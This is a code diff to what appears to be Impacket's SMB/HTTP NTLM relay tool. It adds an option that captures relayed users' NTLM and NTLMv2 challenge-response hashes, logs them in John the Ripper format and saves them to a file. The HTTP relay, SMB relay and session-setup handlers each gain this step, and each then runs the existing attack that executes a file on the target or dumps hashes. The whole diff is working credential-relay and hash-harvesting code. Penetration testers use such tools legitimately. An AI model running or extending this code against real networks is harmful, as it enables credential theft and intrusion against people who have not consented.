@@ -378,10 +378,11 @@ class SMBClient(smb.SMB):
 
 class HTTPRelayServer(Thread):
     class HTTPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
-        def __init__(self, server_address, RequestHandlerClass, target, exeFile, mode):
+        def __init__(self, server_address, RequestHandlerClass, target, exeFile, mode, outputFile):
             self.target = target
             self.exeFile = exeFile
             self.mode = mode
+            self.outputFile = outputFile
 
             SocketServer.TCPServer.__init__(self,server_address, RequestHandlerClass)
 
@@ -469,6 +470,10 @@ class HTTPRelayServer(Thread):
                 else:
                     # Relay worked, do whatever we want here...
                     logging.info("Authenticating against %s as %s\%s SUCCEED" % (self.target,authenticateMessage['domain_name'], authenticateMessage['user_name']))
+                    ntlm_hash_data = outputToJohnFormat( self.challengeMessage['challenge'], authenticateMessage['user_name'], authenticateMessage['domain_name'], authenticateMessage['lanman'], authenticateMessage['ntlm'] )
+                    logging.info(ntlm_hash_data['hash_string'])
+                    if self.server.outputFile is not None:
+                        writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.outputFile)
 
                     clientThread = doAttack(self.client,self.server.exeFile)
                     clientThread.start()
@@ -480,7 +485,7 @@ class HTTPRelayServer(Thread):
                     self.end_headers()
             return 
 
-    def __init__(self):
+    def __init__(self, outputFile=None):
         Thread.__init__(self)
         self.daemon = True
         self.domainIp = None
@@ -489,6 +494,7 @@ class HTTPRelayServer(Thread):
         self.exeFile = None
         self.target = None
         self.mode = None
+        self.outputFile = outputFile
 
     def setTargets(self, target):
         self.target = target
@@ -506,11 +512,11 @@ class HTTPRelayServer(Thread):
 
     def run(self):
         logging.info("Setting up HTTP Server")
-        httpd = self.HTTPServer(("", 80), self.HTTPHandler, self.target, self.exeFile, self.mode)
+        httpd = self.HTTPServer(("", 80), self.HTTPHandler, self.target, self.exeFile, self.mode, self.outputFile)
         httpd.serve_forever()
 
 class SMBRelayServer(Thread):
-    def __init__(self):
+    def __init__(self, outputFile = None):
         Thread.__init__(self)
         self.daemon = True
         self.server = 0
@@ -529,6 +535,9 @@ class SMBRelayServer(Thread):
         smbConfig.set('global','server_domain','WORKGROUP')
         smbConfig.set('global','log_file','smb.log')
         smbConfig.set('global','credentials_file','')
+
+        if outputFile is not None:
+            smbConfig.set('global','jtr_dump_path',outputFile)
 
         # IPC always needed
         smbConfig.add_section('IPC$')
@@ -654,8 +663,6 @@ class SMBRelayServer(Thread):
 
             elif messageType == 0x03:
                 # AUTHENTICATE_MESSAGE, here we deal with authentication
-                authenticateMessage = ntlm.NTLMAuthChallengeResponse()
-                authenticateMessage.fromString(token)
 
                 #############################################################
                 # SMBRelay: Ok, so now the have the Auth token, let's send it
@@ -690,6 +697,10 @@ class SMBRelayServer(Thread):
                 else:
                     # We have a session, create a thread and do whatever we want
                     logging.info("Authenticating against %s as %s\%s SUCCEED" % (self.target,authenticateMessage['domain_name'], authenticateMessage['user_name']))
+                    ntlm_hash_data = outputToJohnFormat( connData['CHALLENGE_MESSAGE']['challenge'], authenticateMessage['user_name'], authenticateMessage['domain_name'], authenticateMessage['lanman'], authenticateMessage['ntlm'] )
+                    logging.info(ntlm_hash_data['hash_string'])
+                    if self.server.getJTRdumpPath() != '':
+                        writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.getJTRdumpPath())
                     del (smbData[self.target])
                     clientThread = doAttack(smbClient,self.exeFile)
                     clientThread.start()
@@ -750,6 +761,10 @@ class SMBRelayServer(Thread):
                 # Now continue with the server
             else:
                 # We have a session, create a thread and do whatever we want
+                ntlm_hash_data = outputToJohnFormat( '', sessionSetupData['Account'], sessionSetupData['PrimaryDomain'], sessionSetupData['AnsiPwd'], sessionSetupData['UnicodePwd'] )
+                logging.info(ntlm_hash_data['hash_string'])
+                if self.server.getJTRdumpPath() != '':
+                    writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.getJTRdumpPath())
                 del (smbData[self.target])
                 clientThread = doAttack(smbClient,self.exeFile)
                 clientThread.start()
@@ -811,6 +826,8 @@ if __name__ == '__main__':
     parser.add_argument("--help", action="help", help='show this help message and exit')
     parser.add_argument('-h', action='store', metavar = 'HOST', help='Host to relay the credentials to, if not it will relay it back to the client')
     parser.add_argument('-e', action='store', required=False, metavar = 'FILE', help='File to execute on the target system. If not specified, hashes would will be dumped (secretsdump.py must be in the same directory)')
+    parser.add_argument('-outputfile', action='store',
+                        help='base output filename for encrypted hashes. Suffixes will be added for ntlm and ntlmv2')
     parser.add_argument('-machine-account', action='store', required=False, help='Domain machine account to use when interacting with the domain to grab a session key for signing, format is domain/machine_name')
     parser.add_argument('-machine-hashes', action="store", metavar = "LMHASH:NTHASH", help='Domain machine hashes, format is LMHASH:NTHASH')
     parser.add_argument('-domain', action="store", help='Domain FQDN or IP to connect using NETLOGON')
@@ -837,7 +854,7 @@ if __name__ == '__main__':
     exeFile = options.e
 
     for server in RELAY_SERVERS:
-        s = server()
+        s = server(options.outputfile)
         s.setTargets(targetSystem)
         s.setExeFile(exeFile)
         s.setMode(mode)
@@ -846,6 +863,7 @@ if __name__ == '__main__':
         elif (options.machine_account is None and options.machine_hashes is None and options.domain is None) is False:
             logging.error("You must specify machine-account/hashes/domain all together!")
             sys.exit(1)
+
         s.start()
         
     print ""
